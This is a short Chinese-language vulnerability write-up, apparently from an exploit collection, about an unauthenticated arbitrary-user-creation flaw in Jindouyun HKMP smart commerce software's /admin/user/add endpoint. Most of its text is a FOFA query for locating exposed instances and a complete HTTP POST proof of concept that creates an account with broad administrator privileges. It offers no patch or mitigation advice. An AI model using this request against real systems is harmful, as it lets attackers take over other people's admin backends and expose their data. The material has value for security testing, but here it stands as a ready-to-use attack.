## 金斗云-HKMP智慧商业软件任意用户添加漏洞

金斗云 HKMP智慧商业软件 /admin/user/add 接口存在任意用户创建漏洞，未经身份验证的远程攻击者可以利用此漏洞创建管理员账户，从而接管系统后台，造成信息泄露，导致系统处于极不安全的状态。

## fofa

```
body="金斗云 HKMP"
```

## poc

```
POST /admin/user/add HTTP/1.1
Content-Type: application/json
Host: 

{"appId":"hkmp","mchId":"hkmp","deviceId":"hkmp","timestamp":1719305067,
"nonce":2287791269,"sign":"hkmp","data":{"userCode":"te1","userName":"te1","password":"123456","privilege":["1000","8000","8010","2000","2001","2010","7000"],"adminUserCode":"admin","adminUserName":"系统管理员"}}
```

![image-20240703170217938](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407031702984.png)